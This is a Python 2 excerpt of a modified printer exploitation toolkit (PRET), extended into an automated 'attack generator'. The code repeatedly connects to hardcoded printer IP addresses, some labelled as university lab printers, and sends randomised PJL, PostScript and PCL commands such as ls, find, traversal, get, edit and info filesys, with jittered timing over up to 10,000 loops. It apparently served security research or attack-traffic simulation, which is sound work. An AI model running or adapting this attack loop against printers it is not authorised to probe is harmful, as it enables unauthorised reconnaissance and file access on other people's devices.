...
import re, os, sys, cmd, glob, errno, random, ntpath, socket
...
# below is modification for execute PRET automatically / made by Asaf Hecht

# initiating public variables for determine the automated attack behavior
howManyTimesAttackingEachPrinter = 10000
randomMaxTimeToWaitBetweenLoops = 1  # 2 seconds
runRandomCommandOrder = True
runRandomNumberCommandsPerLoop = True  # needs runRandomCommandOrder to be also True
randomMaxNumberOfCmdPerPrinter = 5
# switch parameter for waiting constant time between each command to the printer
constantSleep = False
ConstantTimeBetweenCmds = 0.05  # 0.05->50 millisecond
# switch parameter for waiting random time between each command to the printer
randomSleep = True
randomTimeScale = [0, 0.2]  # 0-0.5: between 0 to 0.5 a minute (500 milliseconds)
# future optional parameters:
# sizeBufferToSend = [0,5000] # in Bytes

# list of printers IPs
MyPrinter = ["169.254.15.179"]
MyColoredPrinter = ["169.254.170.153"]
CAresearchPrinter = ["10.0.6.40"]
OldFoundedPrinter = ["169.254.100.111"]
LANprinters = []
BGUlabPrinters = ["132.72.80.84", "132.72.80.79", "132.72.80.87", "132.72.80.96", "132.72.80.97", "132.72.80.224",
                  "132.72.80.81", "132.72.80.82", "132.72.80.92"]
DevPrinters = []
# choosing on what printer to run the attacks
printersToAttack = OldFoundedPrinter
# list of commands in the PRET tool
#GenericReadOnlyCommands = ["ls", "get testFile", "find", "cat testFile", "cd tmp/test", "pwd", "traversal tmp/test",
#                           "df", "free"]
# tested those commands on 27.8.17 on my home research printer - using PJL - start the attacks with "pret.py <printer IP> pjl"
GenericReadOnlyCommands = ["ls", "find", "cd .", "pwd", "traversal .", "df", "free"]
FourSize_GenericReadOnlyCommands = ["ls", "find", "cd .", "pwd", "traversal .", "df", "free",
                                     "ls", "find", "cd .", "pwd", "traversal .", "df", "free",
                                     "ls", "find", "cd .", "pwd", "traversal .", "df", "free",
                                     "ls", "find", "cd .", "pwd", "traversal .", "df", "free"]
PSreadOnlyCommands = ["id", "version", "devices", "uptime", "date", "pagecount", "search testKey", "dicts"]
PJLreadOnlyCommands = ["id", "version", "printenv testVar", "env", "info config", "info filesys", "info id",
                       "info memory ", "info pagecount ", "info status ", "info ustatus ", "info variables"]
PCLreadOnlyCommands = ["info fonts", "info macros", "info patterns", "info symbols", "info extended"]
PCLreadOnlyCommands2 = ["ls","id","cat test","get test","edit test","free", "info fonts", "info patterns", "info symbols", "info extended"]
# choosing the command to executed on the printers:
attackCommands = PCLreadOnlyCommands2
...
# below is modification for execute PRET automatically / made by Asaf Hecht
  ...
  def do_load(self, arg):
    # Modified by Asaf Hecht for multiple attack generator:

    # get another confirmation on the printers that are going to be attacks:
    print "\nWelcome!\n\nHere is the list of printers:"
    counterP = 0
    for printerIP in printersToAttack:
        counterP += 1
        print str(counterP) + ")", printerIP, "=", "didn't try to get the resolved name"
        """
        printerName = socket.gethostbyaddr(printerIP)
        if printerName:
            print str(counterP) + ")", printerIP, "=", printerName[0]
        else:
            print str(counterP) + ")", printerIP, "= no resolved name"
        """
    #confirmation = input("\nAre you sure you want to simulate connections the above listed printers?\nReply Y/N:")
    confirmation = raw_input("\nAre you sure you want to simulate connections to the above listed printers?\nReply Y/N:")
    if confirmation.upper() == "Y":
        print "Great, we are proceeding with the execution..\n"
        loopAttackCounter = 0
        printerAttackCounter = 0
        totalAttackCommands = 0
        # loop over the all attack process for multiple time attacks of each printer
        for loopNumber in range(0,howManyTimesAttackingEachPrinter):
            randomTimeToLoopSleep = uniform(0, randomMaxTimeToWaitBetweenLoops)
            sleep(randomTimeToLoopSleep)
            loopAttackCounter += 1
            print "\nStarting all printers attacks - loop number: " + str(loopAttackCounter)
            # going to attack all the printers in the target array
            for targetPrinterIP in printersToAttack:
                printerAttackCounter += 1
                print "Starting attack session number: " + str(printerAttackCounter)
                print "Attack commands were sent: " + str(totalAttackCommands) + "\n"
                connectCmd = "open " + targetPrinterIP
                self.onecmd(self.precmd(str(connectCmd)))
                print "Started new connection to printer - " + targetPrinterIP + "\n"

                # check if the order of the commands needs to be constant on every printer
                if runRandomCommandOrder:
                    if runRandomNumberCommandsPerLoop:
                        for x in range(0, int(uniform(1, randomMaxNumberOfCmdPerPrinter))):
                            print ("========================= new command =========================")
                            if constantSleep:
                                sleep(ConstantTimeBetweenCmds)
                            if randomSleep:
                                randomTimeToSleep = uniform(randomTimeScale[0], randomTimeScale[1])
                                sleep(randomTimeToSleep)
                            cmd = attackCommands[int(uniform(0, len(attackCommands)))-1]
                            print(self.prompt + cmd)
                            # execute command with premcd
                            self.onecmd(self.precmd(cmd))
                            totalAttackCommands += 1
                    else:
                        print ("========================= new command =========================")
                        if constantSleep:
                            sleep(ConstantTimeBetweenCmds)
                    ...
                    # execute the same commands in the same order on every printer
            ...
            connectCmd = "close"
            self.onecmd(self.precmd(str(connectCmd)))
        confirmation = raw_input("\nAttack sessions that were executed: " + str(printerAttackCounter) +
                                 "\nAttack commands that were sent: " + str(totalAttackCommands) +
                                 "\nDo you want to keep playing?\nReply Y/N:")
        if confirmation.upper() == "Y":
            print "Great"
        else:
            # exit the interpreter
            print "Thanks - the execution was ended.\nGoodBye"
            self.onecmd(self.precmd("exit"))
    else:
        print "You have just chosen to stop the execution...\nGoodBye"
